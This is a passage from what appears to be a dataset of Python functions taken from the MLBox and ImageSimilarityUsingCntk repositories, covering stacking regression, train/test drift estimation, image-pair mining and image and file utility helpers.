    if type(self.verbose) != bool:
        raise ValueError('verbose must be a boolean')
    self.__fitOK = False
    self.__fittransformOK = False"
AxeldeRomblay/MLBox,get_params,"def get_params(self, deep=True):
    """"""Get parameters of a StackingRegressor object.""""""
    return {'level_estimator': self.level_estimator, 'base_estimators': self.base_estimators, 'n_folds': self.n_folds, 'copy': self.copy, 'random_state': self.random_state, 'verbose': self.verbose}"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    """"""Set parameters of a StackingRegressor object.""""""
    self.__fitOK = False
    self.__fittransformOK = False
    for (k, v) in params.items():
        if k not in self.get_params():
            warnings.warn('Invalid parameter a for stacking_regressor StackingRegressor. Parameter IGNORED. Check the list of available parameters with `stacking_regressor.get_params().keys()`')
        else:
            setattr(self, k, v)"
AxeldeRomblay/MLBox,fit_transform,"def fit_transform(self, df_train, y_train):
    """"""Create meta-features for the training dataset.

        Parameters
        ----------
        df_train : pandas DataFrame of shape = (n_samples, n_features)
            The training dataset.

        y_train : pandas series of shape = (n_samples, )
            The target

        Returns
        -------
        pandas DataFrame of shape = (n_samples,
                                     n_features*int(copy)+n_metafeatures)
            The transformed training dataset.

        """"""
    if (type(df_train) != pd.SparseDataFrame) & (type(df_train) != pd.DataFrame):
        raise ValueError('df_train must be a DataFrame')
    if type(y_train) != pd.core.series.Series:
        raise ValueError('y_train must be a Series')
    cv = KFold(n_splits=self.n_folds, shuffle=True, random_state=self.random_state)
    preds = pd.DataFrame([], index=y_train.index)
    if self.verbose:
        print('')
        print('[=============================================================================] LAYER [===================================================================================]')
        print('')
    for (c, reg) in enumerate(self.base_estimators):
        if self.verbose:
            print('> fitting estimator n°' + str(c + 1) + ' : ' + str(reg.get_params()) + ' ...')
            print('')
        y_pred = cross_val_predict(estimator=reg, X=df_train, y=y_train, cv=cv)
        preds['est' + str(c + 1)] = y_pred
        reg.fit(df_train, y_train)
    layer = 1
    columns = ['layer' + str(layer) + '_' + s for s in preds.columns]
    while len(np.intersect1d(df_train.columns, columns)) > 0:
        layer = layer + 1
        columns = ['layer' + str(layer) + '_' + s for s in preds.columns]
    preds.columns = ['layer' + str(layer) + '_' + s for s in preds.columns]
    self.__fittransformOK = True
    if self.copy:
        return pd.concat([df_train, preds], axis=1)
    else:
        return preds"
AxeldeRomblay/MLBox,transform,"def transform(self, df_test):
    """"""Create meta-features for the test dataset.

        Parameters
        ----------
        df_test : pandas DataFrame of shape = (n_samples_test, n_features)
            The test dataset.

        Returns
        -------
        pandas DataFrame of shape = (n_samples_test,
                                     n_features*int(copy)+n_metafeatures)
            The transformed test dataset.

        """"""
    if type(df_test) != pd.SparseDataFrame and type(df_test) != pd.DataFrame:
        raise ValueError('df_test must be a DataFrame')
    if self.__fittransformOK:
        preds_test = pd.DataFrame([], index=df_test.index)
        for (c, reg) in enumerate(self.base_estimators):
            y_pred_test = reg.predict(df_test)
            preds_test['est' + str(c + 1)] = y_pred_test
        layer = 1
        columns = ['layer' + str(layer) + '_' + s for s in preds_test.columns]
        while len(np.intersect1d(df_test.columns, columns)) > 0:
            layer = layer + 1
            columns = ['layer' + str(layer) + '_' + s for s in preds_test.columns]
        preds_test.columns = ['layer' + str(layer) + '_' + s for s in preds_test.columns]
        if self.copy:
            return pd.concat([df_test, preds_test], axis=1)
        else:
            return preds_test
    else:
        raise ValueError('Call fit_transform before !')"
AxeldeRomblay/MLBox,fit,"def fit(self, df_train, y_train):
    """"""Fit the first level estimators and the second level estimator on X.

        Parameters
        ----------
        df_train : pandas DataFrame of shape (n_samples, n_features)
            Input data

        y_train : pandas series of shape = (n_samples, )
            The target

        Returns
        -------
        object
            self

        """"""
    df_train = self.fit_transform(df_train, y_train)
    if self.verbose:
        print('')
        print('[=========================================================================] PREDICTION LAYER [============================================================================]')
        print('')
        print('> fitting estimator : ' + str(self.level_estimator.get_params()) + ' ...')
        print('')
    self.level_estimator.fit(df_train.values, y_train.values)
    self.__fitOK = True
    return self"
AxeldeRomblay/MLBox,predict,"def predict(self, df_test):
    """"""Predict regression target for X_test using the meta-features.

        Parameters
        ----------
        df_test : pandas DataFrame of shape = (n_samples_test, n_features)
            The testing samples

        Returns
        -------
        array of shape = (n_samples_test, )
            The predicted values.

        """"""
    if self.__fitOK:
        df_test = self.transform(df_test)
        return self.level_estimator.predict(df_test)
    else:
        raise ValueError('Call fit before !')"
AxeldeRomblay/MLBox,__init__,"def __init__(self, estimator=RandomForestClassifier(n_estimators=50, n_jobs=-1, max_features=1.0, min_samples_leaf=5, max_depth=5), n_folds=2, stratify=True, random_state=1):
    self.estimator = estimator
    self.n_folds = n_folds
    self.stratify = stratify
    self.random_state = random_state
    self.__cv = None
    self.__pred = None
    self.__target = None
    self.__fitOK = False"
AxeldeRomblay/MLBox,get_params,"def get_params(self):
    return {'estimator': self.estimator, 'n_folds': self.n_folds, 'stratify': self.stratify, 'random_state': self.random_state}"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    if 'estimator' in params.keys():
        self.estimator = params['estimator']
    if 'n_folds' in params.keys():
        self.n_folds = params['n_folds']
    if 'stratify' in params.keys():
        self.stratify = params['stratify']
    if 'random_state' in params.keys():
        self.random_state = params['random_state']"
AxeldeRomblay/MLBox,fit,"def fit(self, df_train, df_test):
    """"""
        Computes the drift between the two datasets

        Parameters
        ----------
        df_train : pandas dataframe of shape = (n_train, p)
            The train set

        df_test : pandas dataframe of shape = (n_test, p)
            The test set

        Returns
        -------
        self : object
            Returns self.
        """"""
    df_train['target'] = 0
    df_test['target'] = 1
    self.__target = pd.concat((df_train.target, df_test.target), ignore_index=True)
    if self.stratify:
        self.__cv = StratifiedKFold(n_splits=self.n_folds, shuffle=True, random_state=self.random_state)
    else:
        self.__cv = KFold(n_splits=self.n_folds, shuffle=True, random_state=self.random_state)
    X_tmp = pd.concat((df_train, df_test), ignore_index=True).drop(['target'], axis=1)
    self.__pred = cross_val_predict(estimator=self.estimator, X=X_tmp, y=self.__target, cv=self.__cv, method='predict_proba')[:, 1]
    del df_train['target']
    del df_test['target']
    self.__fitOK = True
    return self"
AxeldeRomblay/MLBox,score,"def score(self):
    """"""Returns the global drift measure between two datasets.

         0. = No drift. 1. = Maximal Drift

        Returns
        -------
        float
            The drift measure
        """"""
    S = []
    if self.__fitOK:
        X_zeros = np.zeros(len(self.__target))
        for (train_index, test_index) in self.__cv.split(X=X_zeros, y=self.__target):
            S.append(roc_auc_score(self.__target.iloc[test_index], self.__pred[test_index]))
        return (max(np.mean(S), 1 - np.mean(S)) - 0.5) * 2
    else:
        raise ValueError('Call the fit function before !')"
AxeldeRomblay/MLBox,predict,"def predict(self):
    """"""Returns the probabilities that the sample belongs to the test dataset

        Returns
        -------
        Array of shape = (n_train+n_test,)
            The probabilities
        """"""
    if self.__fitOK:
        return self.__pred
    else:
        raise ValueError('Call the fit function before !')"
AxeldeRomblay/MLBox,sync_fit,"def sync_fit(df_train, df_test, estimator, n_folds=2, stratify=True, random_state=1):
    """"""Compute the univariate drifts between df_train and df_test datasets.

    Multi-threaded version.

    Parameters
    ----------
    df_train : pandas dataframe of shape = (n_train, p)
        The train set

    df_test : pandas dataframe of shape = (n_test, p)
        The test set

    estimator : classifier, defaut = RandomForestClassifier(n_estimators = 50,
                                                            n_jobs=-1,
                                                            max_features=1.,
                                                            min_samples_leaf = 5,
                                                            max_depth = 5)
        The estimator that estimates the drift between two datasets

    n_folds : int, default = 2
        Number of folds used to estimate the drift

    stratify : bool, default = True
        Whether the cv is stratified (same number of train and test samples
        within each fold)

    random_state : int, default = 1
        Random state for cv

    Returns
    -------
    float
        drift measure

    """"""
    de = DriftEstimator(estimator, n_folds, stratify, random_state)
    de.fit(df_train, df_test)
    return de.score()"
AxeldeRomblay/MLBox,__init__,"def __init__(self, threshold=0.6, subsample=1.0, estimator=DecisionTreeClassifier(max_depth=6), n_folds=2, stratify=True, random_state=1, n_jobs=-1):
    """"""Init a DriftThreshold object.""""""
    self.threshold = threshold
    self.subsample = subsample
    self.estimator = estimator
    self.n_folds = n_folds
    self.stratify = stratify
    self.random_state = random_state
    self.n_jobs = n_jobs
    self.__Ddrifts = dict()
    self.__fitOK = False"
AxeldeRomblay/MLBox,get_params,"def get_params(self):
    """"""Get parameters of a DriftThreshold object.""""""
    return {'threshold': self.threshold, 'subsample': self.subsample, 'estimator': self.estimator, 'n_folds': self.n_folds, 'stratify': self.stratify, 'random_state': self.random_state, 'n_jobs': self.n_jobs}"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    """"""Set parameters of a DriftThreshold object.""""""
    if 'threshold' in params.keys():
        self.threshold = params['threshold']
    if 'subsample' in params.keys():
        self.subsample = params['subsample']
    if 'estimator' in params.keys():
        self.estimator = params['estimator']
    if 'n_folds' in params.keys():
        self.n_folds = params['n_folds']
    if 'stratify' in params.keys():
        self.stratify = params['stratify']
    if 'random_state' in params.keys():
        self.random_state = params['random_state']
    if 'n_jobs' in params.keys():
        self.n_jobs = params['n_jobs']"
AxeldeRomblay/MLBox,fit,"def fit(self, df_train, df_test):
    """"""Compute the univariate drifts between df_train and df_test datasets.

        Parameters
        ----------
        df_train : pandas dataframe of shape = (n_train, p)
            The train set

        df_test : pandas dataframe of shape = (n_test, p)
            The test set

        Returns
        -------
        None

        """"""
    self.__Ddrifts = dict()
    if sys.platform == 'win32':
        Ldrifts = [sync_fit(df_train.sample(frac=self.subsample)[[col]], df_test.sample(frac=self.subsample)[[col]], self.estimator, self.n_folds, self.stratify, self.random_state) for col in df_train.columns]
    else:
        Ldrifts = Parallel(n_jobs=self.n_jobs)((delayed(sync_fit)(df_train.sample(frac=self.subsample)[[col]], df_test.sample(frac=self.subsample)[[col]], self.estimator, self.n_folds, self.stratify, self.random_state) for col in df_train.columns))
    for (i, col) in enumerate(df_train.columns):
        self.__Ddrifts[col] = Ldrifts[i]
    del Ldrifts
    self.__fitOK = True"
AxeldeRomblay/MLBox,transform,"def transform(self, df):
    """"""Select the features with low drift.

        Parameters
        ----------
        df : pandas dataframe
            A dataset with the same features

        Returns
        -------
        pandas DataFrame
            The transformed dataframe

        """"""
    if self.__fitOK:
        selected_col = []
        for (i, col) in enumerate(df.columns):
            if self.__Ddrifts[col] < self.threshold:
                selected_col.append(col)
        return df[selected_col]
    else:
        raise ValueError('Call the fit function before !')"
AxeldeRomblay/MLBox,get_support,"def get_support(self, complement=False):
    """"""Return the variables kept or dropped.

        Parameters
        ----------
        complement : bool, default = True
            If True, returns the features to drop
            If False, returns the features to keep

        Returns
        -------
        list
            The list of features to keep or to drop.

        """"""
    if self.__fitOK:
        keepList = []
        dropList = []
        for col in self.__Ddrifts:
            if self.__Ddrifts[col] < self.threshold:
                keepList.append(col)
            else:
                dropList.append(col)
        if complement:
            return dropList
        else:
            return keepList
    else:
        raise ValueError('Call the fit function before !')"
AxeldeRomblay/MLBox,drifts,"def drifts(self):
    """"""Return the univariate drifts for all variables.

        Returns
        -------
        dict
            The dictionnary of drift measures for each features

        """"""
    if self.__fitOK:
        return self.__Ddrifts
    else:
        raise ValueError('Call the fit function before !')"
Azure/ImageSimilarityUsingCntk,getImgPaths,"def getImgPaths(imgInfos, rootDir=''):
    paths = set()
    for imgInfo in imgInfos:
        paths.add(rootDir + '/' + imgInfo.subdir + '/' + imgInfo.fname)
        for child in imgInfo.children:
            paths.add(rootDir + '/' + child.subdir + '/' + child.fname)
    return paths"
Azure/ImageSimilarityUsingCntk,getRandomImgInfo,"def getRandomImgInfo(imgFilenames, subdirToExclude=None):
    subdirs = list(imgFilenames.keys())
    subdir = getRandomListElement(subdirs)
    while subdir == subdirToExclude:
        subdir = getRandomListElement(subdirs)
    imgFilename = getRandomListElement(imgFilenames[subdir])
    return ImageInfo(imgFilename, subdir)"
Azure/ImageSimilarityUsingCntk,getImgPairsFeatures,"def getImgPairsFeatures(imgInfos, metric, boL2Normalize):
    feats = []
    labels = []
    for (queryImgIndex, queryImgInfo) in enumerate(imgInfos):
        queryFeat = queryImgInfo.getFeat()
        if boL2Normalize:
            queryFeat /= np.linalg.norm(queryFeat, 2)
        for refImgInfo in queryImgInfo.children:
            refFeat = refImgInfo.getFeat()
            if boL2Normalize:
                refFeat /= np.linalg.norm(refFeat, 2)
            featDiff = queryFeat - refFeat
            if metric.lower() == 'diff':
                feat = featDiff
            elif metric.lower() == 'l1':
                feat = abs(featDiff)
            elif metric.lower() == 'l2':
                feat = featDiff ** 2
            else:
                raise Exception('Unknown metric: ' + metric)
            feats.append(np.float32(feat))
            labels.append(int(refImgInfo.isSameClassAsParent()))
    return (feats, labels)"
Azure/ImageSimilarityUsingCntk,mineHardNegatives,"def mineHardNegatives(learner, imgFilenames, nrAddPerIter, featureDifferenceMetric, boL2Normalize, maxNrRounds, initialThreshold=1):
    hardNegatives = []
    roundCounterHardNegFound = 0
    hardNegThreshold = initialThreshold
    for roundCounter in range(maxNrRounds):
        roundCounterHardNegFound += 1
        if len(hardNegatives) >= nrAddPerIter:
            break
        if roundCounterHardNegFound > 1000:
            hardNegThreshold /= 2.0
            roundCounterHardNegFound = 0
            print('   Hard negative mining sampling round {:6d}: found {:4d} number of hard negatives; reducing hard negative threshold to {:3.3f}.'.format(roundCounter, len(hardNegatives), hardNegThreshold))
        ImageInfo1 = getRandomImgInfo(imgFilenames)
        ImageInfo2 = getRandomImgInfo(imgFilenames, ImageInfo1.subdir)
        ImageInfo1.addChild(ImageInfo2)
        (featCandidate, labelCandidate) = getImgPairsFeatures([ImageInfo1], featureDifferenceMetric, boL2Normalize)
        assert len(labelCandidate) == 1 and labelCandidate[0] == 0 and (ImageInfo1.subdir != ImageInfo2.subdir)
        score = learner.decision_function(featCandidate)
        if score > hardNegThreshold:
            hardNegatives.append(featCandidate[0])
            roundCounterHardNegFound = 0
    print('   Hard negatives found: {}, after {} sampling rounds'.format(len(hardNegatives), roundCounter + 1))
    return hardNegatives"
Azure/ImageSimilarityUsingCntk,getSampleWeights,"def getSampleWeights(labels, negPosRatio=1):
    indsNegatives = np.where(np.array(labels) == 0)[0]
    indsPositives = np.where(np.array(labels) != 0)[0]
    negWeight = float(negPosRatio) * len(indsPositives) / len(indsNegatives)
    weights = np.array([1.0] * len(labels))
    weights[indsNegatives] = negWeight
    assert abs(sum(weights[indsNegatives]) - negPosRatio * sum(weights[indsPositives])) < 10 ** (-3)
    return weights"
Azure/ImageSimilarityUsingCntk,plotScoreVsProbability,"def plotScoreVsProbability(learner, feats_train, feats_test):
    probsTest = learner.predict_proba(feats_test)[:, 1]
    probsTrain = learner.predict_proba(feats_train)[:, 1]
    scoresTest = learner.base_estimator.decision_function(feats_test)
    scoresTrain = learner.base_estimator.decision_function(feats_train)
    plt.scatter(scoresTrain, probsTrain, c='r', label='train')
    plt.scatter(scoresTest, probsTest, c='b', label='test')
    plt.ylim([-0.02, 1.02])
    plt.xlabel('SVM score')
    plt.ylabel('Probability')
    plt.title('Calibrated SVM - training set (red), test set (blue)')
    return plt"
Azure/ImageSimilarityUsingCntk,getImagePairs,"def getImagePairs(imgFilenames, maxQueryImgsPerSubdir, maxNegImgsPerQueryImg):
    querySubdirs = [s for s in imgFilenames.keys() if len(imgFilenames[s]) > 1]
    imgInfos = []
    for querySubdir in querySubdirs:
        queryFilenames = randomizeList(imgFilenames[querySubdir])
        for queryFilename in queryFilenames[:maxQueryImgsPerSubdir]:
            queryInfo = ImageInfo(queryFilename, querySubdir)
            refFilename = getRandomListElement(list(set(queryFilenames) - set([queryFilename])))
            queryInfo.children.append(ImageInfo(refFilename, querySubdir, queryInfo))
            assert refFilename != queryFilename
            for _ in range(maxNegImgsPerQueryImg):
                refSubdir = getRandomListElement(list(set(querySubdirs) - set([querySubdir])))
                refFilename = getRandomListElement(imgFilenames[refSubdir])
                queryInfo.children.append(ImageInfo(refFilename, refSubdir, queryInfo))
                assert refSubdir != querySubdir
            queryInfo.children = randomizeList(queryInfo.children)
            imgInfos.append(queryInfo)
    print('Generated image pairs for {} query images, each with 1 positive image pair and {} negative image pairs.'.format(len(imgInfos), maxNegImgsPerQueryImg))
    return imgInfos"
Azure/ImageSimilarityUsingCntk,getImgLabelMap,"def getImgLabelMap(imgFilenames, imgDir, lut=None):
    table = []
    for label in imgFilenames.keys():
        for imgFilename in imgFilenames[label]:
            imgPath = imgDir + '/' + str(label) + '/' + imgFilename
            if lut != None:
                table.append((imgPath, lut[label]))
            else:
                table.append((imgPath, label))
    return table"
Azure/ImageSimilarityUsingCntk,balanceDatasetUsingDuplicates,"def balanceDatasetUsingDuplicates(data):
    duplicates = []
    counts = collections.Counter(getColumn(data, 1))
    print('Before balancing of training set:')
    for item in counts.items():
        print('   Class {:3}: {:5} exmples'.format(*item))
    targetCount = max(getColumn(counts.items(), 1))
    while min(getColumn(counts.items(), 1)) < targetCount:
        for (imgPath, label) in data:
            if counts[label] < targetCount:
                duplicates.append((imgPath, label))
                counts[label] += 1
    print('After balancing: all classes now have {} images; added {} duplicates to the {} original images.'.format(targetCount, len(duplicates), len(data)))
    data += duplicates
    counts = collections.Counter(getColumn(data, 1))
    assert min(counts.values()) == max(counts.values()) == targetCount
    return data"
Azure/ImageSimilarityUsingCntk,printFeatLabelInfo,"def printFeatLabelInfo(title, feats, labels, preString='   '):
    print(title)
    print(preString + 'Number of examples: {}'.format(len(feats)))
    print(preString + 'Number of positive examples: {}'.format(sum(np.array(labels) == 1)))
    print(preString + 'Number of negative examples: {}'.format(sum(np.array(labels) == 0)))
    print(preString + 'Dimension of each example: {}'.format(len(feats[0])))"
Azure/ImageSimilarityUsingCntk,sklearnAccuracy,"def sklearnAccuracy(learner, feats, gtLabels):
    estimatedLabels = learner.predict(feats)
    confusionMatrix = metrics.confusion_matrix(gtLabels, estimatedLabels)
    return accsConfusionMatrix(confusionMatrix)"
Azure/ImageSimilarityUsingCntk,readFile,"def readFile(inputFile):
    with open(inputFile, 'rb') as f:
        lines = f.readlines()
    for (i, s) in enumerate(lines):
        removeLineEndCharacters(s.decode('utf8'))
    return [removeLineEndCharacters(s.decode('utf8')) for s in lines]"
Azure/ImageSimilarityUsingCntk,writeFile,"def writeFile(outputFile, lines, header=None):
    with open(outputFile, 'w') as f:
        if header != None:
            f.write('%s\n' % header)
        for line in lines:
            f.write('%s\n' % line)"
Azure/ImageSimilarityUsingCntk,writeBinaryFile,"def writeBinaryFile(outputFile, data):
    with open(outputFile, 'wb') as f:
        bytes = f.write(data)
    return bytes"
Azure/ImageSimilarityUsingCntk,readTable,"def readTable(inputFile, delimiter='\t'):
    lines = readFile(inputFile)
    return splitStrings(lines, delimiter)"
Azure/ImageSimilarityUsingCntk,writeTable,"def writeTable(outputFile, table, header=None):
    lines = tableToList1D(table)
    writeFile(outputFile, lines, header)"
Azure/ImageSimilarityUsingCntk,loadFromPickle,"def loadFromPickle(inputFile):
    with open(inputFile, 'rb') as filePointer:
        data = pickle.load(filePointer)
    return data"
Azure/ImageSimilarityUsingCntk,saveToPickle,"def saveToPickle(outputFile, data):
    p = pickle.Pickler(open(outputFile, 'wb'))
    p.fast = True
    p.dump(data)"
Azure/ImageSimilarityUsingCntk,makeDirectory,"def makeDirectory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)"
Azure/ImageSimilarityUsingCntk,getFilesInDirectory,"def getFilesInDirectory(directory, postfix=''):
    if not os.path.exists(directory):
        return []
    fileNames = [s for s in os.listdir(directory) if not os.path.isdir(directory + '/' + s)]
    if not postfix or postfix == '':
        return fileNames
    else:
        return [s for s in fileNames if s.lower().endswith(postfix)]"
Azure/ImageSimilarityUsingCntk,getDirectoriesInDirectory,"def getDirectoriesInDirectory(directory):
    return [s for s in os.listdir(directory) if os.path.isdir(directory + '/' + s)]"
Azure/ImageSimilarityUsingCntk,downloadFromUrl,"def downloadFromUrl(url, boVerbose=True):
    data = []
    url = url.strip()
    try:
        r = requests.get(url, timeout=1)
        data = r.content
    except:
        if boVerbose:
            print('Error downloading url {0}'.format(url))
    if boVerbose and data == []:
        print('Error {} downloading url {}'.format(r.status_code, url))
    return data"
Azure/ImageSimilarityUsingCntk,removeLineEndCharacters,"def removeLineEndCharacters(line):
    if line.endswith('\r\n'):
        return line[:-2]
    elif line.endswith('\n'):
        return line[:-1]
    else:
        return line"
Azure/ImageSimilarityUsingCntk,splitString,"def splitString(string, delimiter='\t', columnsToKeepIndices=None):
    if string == None:
        return None
    items = string.split(delimiter)
    if columnsToKeepIndices != None:
        items = getColumns([items], columnsToKeepIndices)
        items = items[0]
    return items"
Azure/ImageSimilarityUsingCntk,splitStrings,"def splitStrings(strings, delimiter, columnsToKeepIndices=None):
    table = [splitString(string, delimiter, columnsToKeepIndices) for string in strings]
    return table"
Azure/ImageSimilarityUsingCntk,getColumn,"def getColumn(table, columnIndex):
    column = []
    for row in table:
        column.append(row[columnIndex])
    return column"
Azure/ImageSimilarityUsingCntk,tableToList1D,"def tableToList1D(table, delimiter='\t'):
    return [delimiter.join([str(s) for s in row]) for row in table]"
Azure/ImageSimilarityUsingCntk,ToIntegers,"def ToIntegers(list1D):
    return [int(float(x)) for x in list1D]"
Azure/ImageSimilarityUsingCntk,mergeDictionaries,"def mergeDictionaries(dict1, dict2):
    tmp = dict1.copy()
    tmp.update(dict2)
    return tmp"
Azure/ImageSimilarityUsingCntk,getRandomNumber,"def getRandomNumber(low, high):
    randomNumber = random.randint(low, high)
    return randomNumber"
Azure/ImageSimilarityUsingCntk,randomizeList,"def randomizeList(listND, containsHeader=False):
    if containsHeader:
        header = listND[0]
        listND = listND[1:]
    random.shuffle(listND)
    if containsHeader:
        listND.insert(0, header)
    return listND"
Azure/ImageSimilarityUsingCntk,getRandomListElement,"def getRandomListElement(listND, containsHeader=False):
    if containsHeader:
        index = getRandomNumber(1, len(listND) - 1)
    else:
        index = getRandomNumber(0, len(listND) - 1)
    return listND[index]"
Azure/ImageSimilarityUsingCntk,accsConfusionMatrix,"def accsConfusionMatrix(confMatrix):
    perClassAccs = [1.0 * row[rowIndex] / sum(row) for (rowIndex, row) in enumerate(confMatrix)]
    return perClassAccs"
Azure/ImageSimilarityUsingCntk,computeVectorDistance,"def computeVectorDistance(vec1, vec2, method, boL2Normalize, weights=[], bias=[], learner=[]):
    if boL2Normalize:
        vec1 = vec1 / np.linalg.norm(vec1, 2)
        vec2 = vec2 / np.linalg.norm(vec2, 2)
    assert len(vec1) == len(vec2)
    vecDiff = vec1 - vec2
    method = method.lower()
    if method == 'random':
        dist = random.random()
    elif method == 'l1':
        dist = sum(abs(vecDiff))
    elif method == 'l2':
        dist = np.linalg.norm(vecDiff, 2)
    elif method == 'normalizedl2':
        a = vec1 / np.linalg.norm(vec1, 2)
        b = vec2 / np.linalg.norm(vec2, 2)
        dist = np.linalg.norm(a - b, 2)
    elif method == 'cosine':
        dist = scipy.spatial.distance.cosine(vec1, vec2)
    elif method == 'correlation':
        dist = scipy.spatial.distance.correlation(vec1, vec2)
    elif method == 'chisquared':
        dist = chiSquared(vec1, vec2)
    elif method == 'normalizedchisquared':
        a = vec1 / sum(vec1)
        b = vec2 / sum(vec2)
        dist = chiSquared(a, b)
    elif method == 'hamming':
        dist = scipy.spatial.distance.hamming(vec1 > 0, vec2 > 0)
    elif method == 'mahalanobis':
        dist = scipy.spatial.distance.mahalanobis(vec1, vec2, sampleCovMat)
    elif method == 'weightedl1':
        feat = np.float32(abs(vecDiff))
        dist = np.dot(weights, feat) + bias
        dist = -float(dist)
    elif method == 'weightedl2':
        feat = vecDiff ** 2
        dist = np.dot(weights, feat) + bias
        dist = -float(dist)
    elif method == 'weightedl2prob':
        feat = vecDiff ** 2
        dist = learner.predict_proba([feat])[0][1]
        dist = float(dist)
    else:
        raise Exception('Distance method unknown: ' + method)
    assert not np.isnan(dist)
    return dist"
Azure/ImageSimilarityUsingCntk,rotationFromExifTag,"def rotationFromExifTag(imgPath):
    TAGSinverted = {v: k for (k, v) in list(ExifTags.TAGS.items())}
    orientationExifId = TAGSinverted['Orientation']
    try:
        imageExifTags = Image.open(imgPath)._getexif()
    except:
        imageExifTags = None
    rotation = 0
    if imageExifTags != None and orientationExifId != None and (orientationExifId in imageExifTags):
        orientation = imageExifTags[orientationExifId]
        if orientation == 1 or orientation == 0:
            rotation = 0
        elif orientation == 6:
            rotation = -90
        elif orientation == 8:
            rotation = 90
        else:
            raise Exception('ERROR: orientation = ' + str(orientation) + ' not_supported!')
    return rotation"
Azure/ImageSimilarityUsingCntk,imread,"def imread(imgPath, boThrowErrorIfExifRotationTagSet=True):
    if not os.path.exists(imgPath):
        raise Exception('ERROR: image path does not exist.')
    rotation = rotationFromExifTag(imgPath)
    if boThrowErrorIfExifRotationTagSet and rotation != 0:
        print('Error: exif roation tag set, image needs to be rotated by %d degrees.' % rotation)
    img = cv2.imread(imgPath)
    if img is None:
        raise Exception('ERROR: cannot load image ' + imgPath)
    if rotation != 0:
        img = imrotate(img, -90).copy()
    return img"
Azure/ImageSimilarityUsingCntk,imWidth,"def imWidth(input):
    return imWidthHeight(input)[0]"
Azure/ImageSimilarityUsingCntk,imHeight,"def imHeight(input):
    return imWidthHeight(input)[1]"
Azure/ImageSimilarityUsingCntk,imWidthHeight,"def imWidthHeight(input):
    if type(input) is str:
        (width, height) = Image.open(input).size
    else:
        width = input.shape[1]
        height = input.shape[0]
    return (width, height)"
Azure/ImageSimilarityUsingCntk,imconvertCv2Numpy,"def imconvertCv2Numpy(img):
    (b, g, r) = cv2.split(img)
    return cv2.merge([r, g, b])"
Azure/ImageSimilarityUsingCntk,imconvertCv2Pil,"def imconvertCv2Pil(img):
    cv2_im = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
    pil_im = Image.fromarray(cv2_im)
    return pil_im"
Azure/ImageSimilarityUsingCntk,imconvertPil2Cv,"def imconvertPil2Cv(pilImg):
    return imconvertPil2Numpy(pilImg)[:, :, ::-1]"
Azure/ImageSimilarityUsingCntk,imconvertPil2Numpy,"def imconvertPil2Numpy(pilImg):
    rgb = pilImg.convert('RGB')
    return np.array(rgb).copy()"
Azure/ImageSimilarityUsingCntk,imresize,"def imresize(img, scale, interpolation=cv2.INTER_LINEAR):
    return cv2.resize(img, (0, 0), fx=scale, fy=scale, interpolation=interpolation)"
Azure/ImageSimilarityUsingCntk,imresizeMaxDim,"def imresizeMaxDim(img, maxDim, boUpscale=False, interpolation=cv2.INTER_LINEAR):
    scale = 1.0 * maxDim / max(img.shape[:2])
    if scale < 1 or boUpscale:
        img = imresize(img, scale, interpolation)
    else:
        scale = 1.0
    return (img, scale)"
Azure/ImageSimilarityUsingCntk,imresizeAndPad,"def imresizeAndPad(img, width, height, padColor):
    (imgWidth, imgHeight) = imWidthHeight(img)
    scale = min(float(width) / float(imgWidth), float(height) / float(imgHeight))
    imgResized = imresize(img, scale)
    (resizedWidth, resizedHeight) = imWidthHeight(imgResized)
    top = int(max(0, np.round((height - resizedHeight) / 2)))
    left = int(max(0, np.round((width - resizedWidth) / 2)))
    bottom = height - top - resizedHeight
    right = width - left - resizedWidth
    return cv2.copyMakeBorder(imgResized, top, bottom, left, right, cv2.BORDER_CONSTANT, value=padColor)"
Azure/ImageSimilarityUsingCntk,imrotate,"def imrotate(img, angle):
    imgPil = imconvertCv2Pil(img)
    imgPil = imgPil.rotate(angle, expand=True)
    return imconvertPil2Cv(imgPil)"
Azure/ImageSimilarityUsingCntk,imshow,"def imshow(img, waitDuration=0, maxDim=None, windowName='img'):
    if isinstance(img, str):
        img = cv2.imread(img)
    if maxDim is not None:
        scaleVal = 1.0 * maxDim / max(img.shape[:2])
        if scaleVal < 1:
            img = imresize(img, scaleVal)
    cv2.imshow(windowName, img)
    cv2.waitKey(waitDuration)"
Azure/ImageSimilarityUsingCntk,__init__,"def __init__(self, fname, subdir, parent=None):
    self.fname = fname
    self.subdir = subdir
    self.children = []
    self.parent = parent
    if parent:
        self.parent = self.shallowCopy(parent)"
Azure/ImageSimilarityUsingCntk,getFeat,"def getFeat(self):
    if self.allFeatures == []:
        raise Exception(""Need to set/load DNN features first using e.g. this line 'ImageInfo.allFeatures = loadFromPickle(featuresPath)'"")
    key = self.subdir + '/' + self.fname
    feat = np.array(self.allFeatures[key], np.float32)
    assert len(feat) == 4096 or len(feat) == 2048 or len(feat) == 512 or (len(feat) == 25088)
    return feat"
Azure/ImageSimilarityUsingCntk,getImg,"def getImg(self, rootDir):
    imgPath = self.getImgPath(rootDir)
    return imread(imgPath)"
Azure/ImageSimilarityUsingCntk,getImgPath,"def getImgPath(self, rootDir):
    return rootDir + self.subdir + '/' + self.fname"
Azure/ImageSimilarityUsingCntk,addChild,"def addChild(self, node):
    node.parent = self
    self.children.append(node)"
Azure/ImageSimilarityUsingCntk,isSameClassAsParent,"def isSameClassAsParent(self):
    return self.subdir == self.parent.subdir"
Azure/ImageSimilarityUsingCntk,shallowCopy,"def shallowCopy(self, node):
    return ImageInfo(node.fname, node.subdir, node.parent)"
Azure/ImageSimilarityUsingCntk,display,"def display(self):
    print('Parent: ' + self.node2Str(self))
    for (childIndex, child) in enumerate(self.children):
        print('   Child {:4} : {}'.format(childIndex, self.node2Str(child)))"
Azure/ImageSimilarityUsingCntk,node2Str,"def node2Str(self, node):
    return 'fname = {}, subdir={}'.format(node.fname, node.subdir)"
Azure/ImageSimilarityUsingCntk,printDeviceType,"def printDeviceType(boGpuRequired=False):
    if use_default_device().type() != 0:
        print('Using GPU for CNTK training/scoring.')
    else:
        print('WARNING: using CPU for CNTK training/scoring.')
        if boGpuRequired:
            raise Exception('Cannot find GPU or GPU is already locked.')"
Azure/ImageSimilarityUsingCntk,create_mb_source,"def create_mb_source(map_file, image_width, image_height, num_channels, num_classes, boTrain):
    transforms = []
    if boTrain:
